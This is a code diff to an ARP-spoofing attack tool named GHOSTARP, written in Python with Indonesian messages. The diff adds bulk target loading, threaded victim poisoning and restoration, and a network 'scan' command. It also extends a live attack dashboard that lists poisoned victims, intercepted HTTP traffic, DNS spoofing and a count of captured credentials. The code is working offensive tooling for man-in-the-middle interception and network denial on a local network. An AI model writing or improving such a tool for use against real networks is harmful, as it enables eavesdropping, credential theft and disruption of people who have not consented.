@@ -318,6 +318,40 @@ class Victim:
     packets: int = 0            # paket ARP yang dikirim untuk korban ini
 
 
+def parse_targets_cli(target_str: Optional[str], target_file: Optional[str], iface: str) -> List[Victim]:
+    ips = []
+    if target_str:
+        for t in target_str.split(","):
+            t = t.strip()
+            if valid_ip(t):
+                ips.append(valid_ip(t))
+    if target_file:
+        try:
+            with open(target_file) as f:
+                for line in f:
+                    line = line.strip()
+                    if not line or line.startswith("#"):
+                        continue
+                    parts = line.split()
+                    if parts:
+                        t = parts[0]
+                        if valid_ip(t):
+                            ips.append(valid_ip(t))
+        except Exception as e:
+            console.print(f"[red][!] Gagal membaca file target: {e}[/]")
+    
+    victims = []
+    for ip in sorted(list(set(ips))):
+        console.print(f"[*] Resolving MAC untuk target CLI: {ip}...")
+        mac = resolve_mac(ip, iface)
+        if mac:
+            victims.append(Victim(ip=ip, mac=mac))
+            console.print(f"[green][+] Target terdaftar: {ip} ({mac})[/]")
+        else:
+            console.print(f"[red][!] Gagal resolve MAC untuk {ip}. Dilewati.[/]")
+    return victims
+
+
 @dataclass
 class State:
     start_time: float = field(default_factory=time.time)
@@ -496,17 +530,24 @@ class ArpSpoof:
         if ip == self.gateway_ip:
             state.add_log("Tidak bisa menarget gateway", "red")
             return
-        mac = resolve_mac(ip, self.iface)
-        if not mac:
-            state.add_log(f"Gagal resolve MAC {ip}", "red")
-            return
-        with self._vlock:
-            new_v = Victim(ip=ip, mac=mac)
-            self.victims.append(new_v)
-            with state._lock:
-                state.victims = list(self.victims)
-        self.send_poison()   # langsung racuni (termasuk target baru)
-        state.add_log(f"[+] Target ditambahkan: {ip} ({mac})", "green")
+
+        def do_add():
+            state.add_log(f"Resolving MAC untuk target {ip}...", "yellow")
+            mac = resolve_mac(ip, self.iface)
+            if not mac:
+                state.add_log(f"Gagal resolve MAC {ip}", "red")
+                return
+            with self._vlock:
+                if any(v.ip == ip for v in self.victims):
+                    return
+                new_v = Victim(ip=ip, mac=mac)
+                self.victims.append(new_v)
+                with state._lock:
+                    state.victims = list(self.victims)
+            self.send_poison()   # langsung racuni (termasuk target baru)
+            state.add_log(f"[+] Target ditambahkan: {ip} ({mac})", "green")
+
+        threading.Thread(target=do_add, daemon=True).start()
 
     def del_victim(self, ip: str, state: State) -> None:
         with self._vlock:
@@ -517,7 +558,10 @@ class ArpSpoof:
             self.victims.remove(v)
             with state._lock:
                 state.victims = list(self.victims)
-        self.restore_target(v, count=RESTORE_COUNT_FAST)
+        
+        def do_restore():
+            self.restore_target(v, count=RESTORE_COUNT_FAST)
+        threading.Thread(target=do_restore, daemon=True).start()
         state.add_log(f"[-] Target dihapus: {ip} - ARP di-restore", "yellow")
 
     def set_mode(self, mode: str, state: State) -> None:
@@ -908,7 +952,7 @@ def handle_cmd(state: State, cmd: str, attack_ref: List[Optional[ArpSpoof]], sto
         
         if c == "help":
             state.add_log(
-                "Attack commands: stop | pause | resume | mode mitm|kill | add <ip> | del <ip> | dns add d=ip | dns del d | quit",
+                "Attack commands: stop | pause | resume | mode mitm|kill | add <ip|num> | del <ip|num|all> | scan | dns add d=ip | dns del d | quit",
                 "cyan"
             )
         elif c == "stop":
@@ -934,19 +978,57 @@ def handle_cmd(state: State, cmd: str, attack_ref: List[Optional[ArpSpoof]], sto
             state.add_log("Attack dihentikan. Kembali ke Setup Mode.", "green")
             
         elif c == "add":
+            if len(parts) < 2:
+                state.add_log("Format: add <ip_atau_indeks>", "red")
+                return
             for tok in ",".join(parts[1:]).split(","):
                 tok = tok.strip()
-                if tok:
-                    attack.add_victim(tok, state)
+                if not tok:
+                    continue
+                target_ip = None
+                if tok.isdigit():
+                    idx = int(tok) - 1
+                    with state._lock:
+                        if 0 <= idx < len(state.scanned_hosts):
+                            target_ip = state.scanned_hosts[idx][0]
+                        else:
+                            state.add_log(f"Indeks host {tok} tidak valid", "red")
+                else:
+                    target_ip = valid_ip(tok)
+                
+                if target_ip:
+                    attack.add_victim(target_ip, state)
+
         elif c == "del":
-            if len(parts) > 1 and parts[1].lower() == "all":
+            if len(parts) < 2:
+                state.add_log("Format: del <ip_atau_indeks|all>", "red")
+                return
+            val = parts[1].lower()
+            if val == "all":
                 for v in attack.victims_snapshot():
                     attack.del_victim(v.ip, state)
             else:
                 for tok in ",".join(parts[1:]).split(","):
                     tok = tok.strip()
-                    if tok:
-                        attack.del_victim(tok, state)
+                    if not tok:
+                        continue
+                    target_ip = None
+                    if tok.isdigit():
+                        idx = int(tok) - 1
+                        with state._lock:
+                            if 0 <= idx < len(state.scanned_hosts):
+                                target_ip = state.scanned_hosts[idx][0]
+                            else:
+                                state.add_log(f"Indeks {tok} tidak valid", "red")
+                    else:
+                        target_ip = valid_ip(tok)
+                    
+                    if target_ip:
+                        attack.del_victim(target_ip, state)
+
+        elif c in ("scan", "sweep", "rescan"):
+            background_scan(state)
+
         elif c == "pause":
             attack.set_paused(True, state)
         elif c == "resume":
@@ -1080,7 +1162,7 @@ def build_dashboard(state: State, inp: InputState, attack_ref: List[Optional[Arp
         info.add_row("MAC Spoofing", "[green]ENABLED[/] (Randomized on start)" if state.mac_spoof else "[dim]DISABLED[/]")
         info.add_row("DNS Spoofing", f"[yellow]{len(state.dns_spoof_map)}[/] domains active")
         
-        info_panel = Panel(info, title="[bold cyan] Configuration[/]", border_style="cyan", expand=True)
+        info_panel = Panel(info, title="[bold cyan]🔧 Configuration[/]", border_style="cyan", expand=True)
 
         # Targets Panel Left
         vt = Table(box=SIMPLE_HEAVY, header_style="bold yellow", expand=True)
@@ -1090,7 +1172,7 @@ def build_dashboard(state: State, inp: InputState, attack_ref: List[Optional[Arp
         for v in state.victims:
             vt.add_row(v.ip, v.mac)
             
-        targets_title = f"[bold yellow] Selected Targets ({len(state.victims)})[/]"
+        targets_title = f"[bold yellow]🎯 Selected Targets ({len(state.victims)})[/]"
         targets_panel = Panel(
             vt if state.victims else Text("\n  Daftar target kosong.\n  Ketik 'add <ip_atau_nomor>' untuk menambahkan.", style="dim italic"), 
             title=targets_title, 
@@ -1116,7 +1198,7 @@ def build_dashboard(state: State, inp: InputState, attack_ref: List[Optional[Arp
                 status = "[dim]available[/]"
             ht.add_row(str(i + 1), ip, mac, status)
             
-        hosts_title = f"[bold green] Discovered Hosts ({len(hosts)})[/]"
+        hosts_title = f"[bold green]🔍 Discovered Hosts ({len(hosts)})[/]"
         if state.scanning:
             hosts_title += " [blink yellow](Scanning...)[/]"
             
@@ -1133,7 +1215,7 @@ def build_dashboard(state: State, inp: InputState, attack_ref: List[Optional[Arp
         log_table.add_column("Action / Event")
         for ts, msg, style in log[-8:]:
             log_table.add_row(ts, f"[{style}]{msg}[/]")
-        log_panel = Panel(log_table, title="[bold magenta] Configuration Logs[/]", border_style="magenta", expand=True)
+        log_panel = Panel(log_table, title="[bold magenta]📝 Configuration Logs[/]", border_style="magenta", expand=True)
 
         # Layout grids
         top_grid = Table.grid(padding=(0, 1), expand=True)
@@ -1156,7 +1238,7 @@ def build_dashboard(state: State, inp: InputState, attack_ref: List[Optional[Arp
         
         return Panel(
             Group(top_grid, log_panel, bar),
-            title="[bold cyan] GHOSTARP v1.5 - Setup Mode [/]",
+            title="[bold cyan]⚡ GHOSTARP v1.5 - Setup Mode ⚡[/]",
             subtitle=subtitle,
             border_style="cyan"
         )
@@ -1181,7 +1263,7 @@ def build_dashboard(state: State, inp: InputState, attack_ref: List[Optional[Arp
         info.add_row("Poisoning", "[bold red]POISONING ACTIVE[/]" if not attack.paused else "[yellow]PAUSED[/]")
         info.add_row("Uptime", f"[white]{fmt_uptime(time.time() - state.start_time)}[/]")
         
-        info_panel = Panel(info, title="[bold red] Attack Status[/]", border_style="red", expand=True)
+        info_panel = Panel(info, title="[bold red]💀 Attack Status[/]", border_style="red", expand=True)
 
         stats = Table.grid(padding=(0, 2))
         stats.add_column(style="magenta bold")
@@ -1191,7 +1273,7 @@ def build_dashboard(state: State, inp: InputState, attack_ref: List[Optional[Arp
         stats.add_row("HTTP Sniffed", f"[green]{len(http):,}[/]")
         stats.add_row("DNS Spoofed", f"[cyan]{len(attack.spoof_snapshot())}[/]")
         stats.add_row("Credentials Captured", f"[bold blink red]{creds}[/]")
-        stats_panel = Panel(stats, title="[bold magenta] Statistics[/]", border_style="magenta", expand=True)
+        stats_panel = Panel(stats, title="[bold magenta]📊 Statistics[/]", border_style="magenta", expand=True)
 
         vt = Table(box=SIMPLE_HEAVY, header_style="bold yellow", expand=True)
         vt.add_column("Target IP", style="bold yellow")
@@ -1199,7 +1281,36 @@ def build_dashboard(state: State, inp: InputState, attack_ref: List[Optional[Arp
         vt.add_column("Packets Sent", justify="right")
         for v in victims:
             vt.add_row(v.ip, v.mac, f"{v.packets:,}")
-        targets_panel = Panel(vt, title="[bold yellow] Poisoned Victims[/]", border_style="yellow", expand=True)
+        targets_panel = Panel(vt, title="[bold yellow]🎯 Poisoned Victims[/]", border_style="yellow", expand=True)
+
+        # Hosts Panel Right
+        hosts = state.scanned_hosts
+        ht = Table(box=SIMPLE_HEAVY, header_style="bold green", expand=True)
+        ht.add_column("#", justify="right", style="dim")
+        ht.add_column("IP Address", style="bold yellow")
+        ht.add_column("MAC Address", style="cyan")
+        ht.add_column("Status")
+        
+        target_ips = {v.ip for v in victims}
+        for i, (ip, mac) in enumerate(hosts[:HOSTS_DISPLAY_MAX]):
+            if ip == state.gateway_ip:
+                status = "[red]GATEWAY[/]"
+            elif ip in target_ips:
+                status = "[bold yellow]TARGET ✓[/]"
+            else:
+                status = "[dim]available[/]"
+            ht.add_row(str(i + 1), ip, mac, status)
+            
+        hosts_title = f"[bold green]🔍 Discovered Hosts ({len(hosts)})[/]"
+        if state.scanning:
+            hosts_title += " [blink yellow](Scanning...)[/]"
+            
+        hosts_panel = Panel(
+            ht if hosts else Text("\n  Tidak ada host / Belum scan.\n  Ketik 'scan' untuk memindai jaringan.", style="dim italic"),
+            title=hosts_title,
+            border_style="green",
+            expand=True
+        )
 
         http_table = Table(box=SIMPLE_HEAVY, header_style="bold cyan", expand=True)
         http_table.add_column("Waktu", style="dim", width=8)
@@ -1211,16 +1322,17 @@ def build_dashboard(state: State, inp: InputState, attack_ref: List[Optional[Arp
             mstyle = "bold red" if method == "POST" else "green"
             http_table.add_row(ts, src, f"[{mstyle}]{method}[/]", url)
             
-        sniff_panel = Panel(http_table, title=f"[bold cyan] Live Intercepted Traffic (Sniff Ports: {attack.sniff_ports})[/]", border_style="cyan", expand=True)
+        sniff_panel = Panel(http_table, title=f"[bold cyan]🌐 Live Intercepted Traffic (Sniff Ports: {attack.sniff_ports})[/]", border_style="cyan", expand=True)
 
         log_table = Table(box=SIMPLE_HEAVY, header_style="bold green", expand=True)
         log_table.add_column("Waktu", style="dim", width=8)
         log_table.add_column("Event")
         for ts, msg, style in log[-8:]:
             log_table.add_row(ts, f"[{style}]{msg}[/]")
-        log_panel = Panel(log_table, title="[bold green] Event Logs[/]", border_style="green", expand=True)
+        log_panel = Panel(log_table, title="[bold green]📝 Event Logs[/]", border_style="green", expand=True)
 
         top_grid = Table.grid(padding=(0, 1), expand=True)
+        top_grid.add_column(ratio=1)
         top_grid.add_column(ratio=1)
         top_grid.add_column(ratio=1)
         
@@ -1228,19 +1340,19 @@ def build_dashboard(state: State, inp: InputState, attack_ref: List[Optional[Arp
         left_grid.add_row(info_panel)
         left_grid.add_row(stats_panel)
         
-        top_grid.add_row(left_grid, targets_panel)
+        top_grid.add_row(left_grid, targets_panel, hosts_panel)
 
         bar = Table.grid(padding=(0, 1), expand=True)
         bar.add_row(Text("Attack Active > ", style="bold red") + Text(inp.buf) + Text("▏", style="red"))
         
         subtitle = (
-            "Type: [bold yellow]stop[/] | [white]pause[/] | [white]resume[/] | [white]mode <mitm|kill>[/] | [white]add <ip>[/] | [white]del <ip>[/]\n"
-            "      [white]dns add d=ip[/] | [white]dns del d[/] | [bold red]quit[/]"
+            "Type: [bold yellow]stop[/] | [white]pause[/] | [white]resume[/] | [white]mode <mitm|kill>[/] | [white]add <ip|num>[/] | [white]del <ip|num|all>[/]\n"
+            "      [white]scan[/] | [white]dns add d=ip[/] | [white]dns del d[/] | [bold red]quit[/]"
         )
         
         return Panel(
             Group(top_grid, sniff_panel, log_panel, bar),
-            title="[bold blink red] GHOSTARP v1.5 - ATTACK ACTIVE [/]",
+            title="[bold blink red]💀 GHOSTARP v1.5 - ATTACK ACTIVE 💀[/]",
             subtitle=subtitle,
             border_style="red"
         )
